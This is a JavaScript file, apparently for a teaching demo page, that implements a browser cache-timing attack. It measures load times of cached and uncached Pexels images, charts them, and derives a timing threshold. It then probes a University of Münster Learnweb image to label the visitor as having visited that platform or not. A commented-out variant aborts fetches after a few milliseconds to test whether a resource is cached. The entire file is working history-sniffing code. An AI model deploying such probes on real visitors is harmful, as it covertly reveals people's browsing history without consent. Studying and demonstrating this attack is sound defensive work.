var cached_images = ["https://images.pexels.com/photos/288101/pexels-photo-288101.jpeg?auto=compress&cs=tinysrgb&dpr=1&w=500",
    "https://images.pexels.com/photos/831890/pexels-photo-831890.jpeg?auto=compress&cs=tinysrgb&dpr=2&h=650&w=940",
    "https://images.pexels.com/photos/1635905/pexels-photo-1635905.jpeg?auto=compress&cs=tinysrgb&dpr=2&h=650&w=940",
    "https://images.pexels.com/photos/1662242/pexels-photo-1662242.jpeg?auto=compress&cs=tinysrgb&dpr=1&w=500",
    "https://images.pexels.com/photos/3694341/pexels-photo-3694341.jpeg?auto=compress&cs=tinysrgb&dpr=2&h=650&w=940",
    "https://images.pexels.com/photos/755858/pexels-photo-755858.jpeg?auto=compress&cs=tinysrgb&dpr=2&h=750&w=1260"];

var not_cached_images = ["https://images.pexels.com/photos/1055272/pexels-photo-1055272.jpeg?auto=compress&cs=tinysrgb&dpr=1&w=500",
    "https://images.pexels.com/photos/2955819/pexels-photo-2955819.jpeg?auto=compress&cs=tinysrgb&dpr=1&w=500",
    "https://images.pexels.com/photos/793765/pexels-photo-793765.jpeg?auto=compress&cs=tinysrgb&dpr=1&w=500",
    "https://images.pexels.com/photos/1346345/pexels-photo-1346345.jpeg?auto=compress&cs=tinysrgb&dpr=1&w=500",
    "https://images.pexels.com/photos/3750709/pexels-photo-3750709.jpeg?auto=compress&cs=tinysrgb&dpr=1&w=500",
    "https://images.pexels.com/photos/343870/pexels-photo-343870.jpeg?auto=compress&cs=tinysrgb&dpr=1&w=500"];

var not_cached_loading_time = Array(150).fill(0);
var cached_loading_time = Array(150).fill(0);
var num_not_cached = 0;
var num_cached = 0;
var boundary = 0;
var miss_min = 1000;

var ctx = document.getElementById('chart').getContext('2d');
var myBarChart = new Chart(ctx, {
    type: 'bar',
    data: {
        labels: Array.from(Array(150).keys()),
        datasets: []
    },

    // Configuration options go here
    options: {}
});

function notCachedTime(loadtime) {
    if (loadtime < miss_min) {
        miss_min = loadtime;
    }

    not_cached_loading_time[loadtime] += 1;
    num_not_cached += 1
    if (not_cached_images.length === num_not_cached) {
        myBarChart.data.datasets.push({
            label: 'Cache Misses',
            backgroundColor: '#ff6c6c',
            data: not_cached_loading_time
        });
        boundary = miss_min - 10;
        let boundary_chart = Array(150).fill(0);
        boundary_chart[boundary] = 2;
        myBarChart.data.datasets.push({
            label: 'Decision Boundary',
            backgroundColor: '#0046ff',
            data: boundary_chart
        });
        myBarChart.update();
    }
}

function cachedTime(loadtime) {
    cached_loading_time[loadtime] += 1;
    num_cached += 1
    if (cached_images.length === num_cached) {
        myBarChart.data.datasets.push({
            label: 'Cache Hits',
            backgroundColor: '#6cff84',
            data: cached_loading_time
        });
        myBarChart.update();
    }
}

async function getLoadTime(url, purge = false, cached = true) {
    var controller = new AbortController();
    var signal = controller.signal;
    var startTime = new Date().getTime();
    try {
        // credentials option is needed for Firefox
        let options = {
            mode: "no-cors",
            credentials: "include",
            signal: signal
        };
        // If the option "cache: reload" is set, the browser will purge
        // the resource from the browser cache
        if (purge) options.cache = "reload";

        await fetch(url, options);
    } catch (err) {
        console.log("Error occured.")
    }
    var loadtime = new Date().getTime() - startTime;
    if (cached) {
        cachedTime(loadtime);
    } else {
        notCachedTime(loadtime);
    }

    console.log("Image was loaded in " + loadtime);
    return loadtime;
}

async function checkPlatform(url, platform) {
    var controller = new AbortController();
    var signal = controller.signal;
    var startTime = new Date().getTime();
    try {
        // credentials option is needed for Firefox
        let options = {
            mode: "no-cors",
            credentials: "include",
            signal: signal
        };
        await fetch(url, options);
    } catch (err) {
        console.log("Error occured.")
    }
    var loadtime = new Date().getTime() - startTime;
    if (loadtime < boundary) {
        $('#' + platform.toLowerCase() + " span").text("Besucht (" + loadtime + ")")
    } else {
        $('#' + platform.toLowerCase() + " span").text("Nicht Besucht (" + loadtime + ")")
    }
}

$(document).ready(function () {
    var platforms = {
        "Learnweb": "https://www.uni-muenster.de/LearnWeb/learnweb2/pluginfile.php/1/local_marketing/slidesfilearea/5/ratingallocate.png"
    };

    $("#btnTimeCache").click(async function () {
        for (let i = 0; i < cached_images.length; i++) {
            await getLoadTime(cached_images[i]);
            $('#imgL' + (i + 1)).attr("src", cached_images[i]);
        }
    });

    $("#btnTimeNotCached").click(async function () {
        for (let i = 0; i < not_cached_images.length; i++) {
            await getLoadTime(not_cached_images[i], false, false);
            $('#img' + (i + 1)).attr("src", cached_images[i]);
        }
    });

    $("#btnCreateProfile").click(function () {
        let key;
        for (key in platforms) {
            checkPlatform(platforms[key], key);
        }
    });
});


/* async function ifCached(url, purge = false, cached = true) {
   var controller = new AbortController();
   var signal = controller.signal;
   // After 9ms, abort the request (before the request was finished).
   // The timeout might need to be adjusted for the attack to work properly.
   // Purging content seems to take slightly less time than probing
   var wait_time = (purge) ? 3 : 9;
   var startTime = new Date().getTime();
   var timeout = await setTimeout(() => {
       controller.abort();
   }, wait_time);
   try {
       // credentials option is needed for Firefox
       let options = {
           mode: "no-cors",
           credentials: "include",
           signal: signal
       };
       // If the option "cache: reload" is set, the browser will purge
       // the resource from the browser cache
       if (purge) options.cache = "reload";

       await fetch(url, options);
   } catch (err) {
       // When controller.abort() is called, the fetch will throw an Exception
       if (purge) console.log("The resource was purged from the cache");
       else console.log("The resource is not cached");
       var loadtime = new Date().getTime() - startTime;
       if (cached) {
           cachedTime(loadtime);
       } else {
           notCachedTime(loadtime);
       }
       return loadtime
   }
   // clearTimeout will only be called if this line was reached in less than
   // wait_time which means that the resource must have arrived from the cache
   clearTimeout(timeout);
   var loadtime = new Date().getTime() - startTime;
   if (cached) {
       cachedTime(loadtime);
   } else {
       notCachedTime(loadtime);
   }
   console.log("The resource is cached");

   return loadtime;
} */